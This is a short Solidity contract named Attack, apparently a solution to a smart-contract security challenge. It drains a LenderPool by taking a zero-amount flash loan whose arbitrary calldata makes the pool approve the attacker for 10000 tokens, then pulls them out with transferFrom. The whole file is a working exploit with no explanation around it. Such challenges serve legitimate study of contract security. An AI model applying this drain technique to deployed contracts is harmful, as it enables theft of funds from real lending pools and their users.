// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./LenderPool.sol";

contract Attack {
    LenderPool pool;
    MyToken token;

    constructor(address _pool, address _token) {
        pool = LenderPool(_pool);
        token = MyToken(_token);
    }

    function attack()
    public
    returns (uint256 before_balance, uint256 after_balance)
    {
        before_balance = token.balanceOf(address(this));
        bytes memory _calldata = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            10000
        );
        pool.flashLoan(0, address(this), address(token), _calldata);


        token.transferFrom(address(pool), address(this), 10000);
        after_balance = token.balanceOf(address(this));
    }
}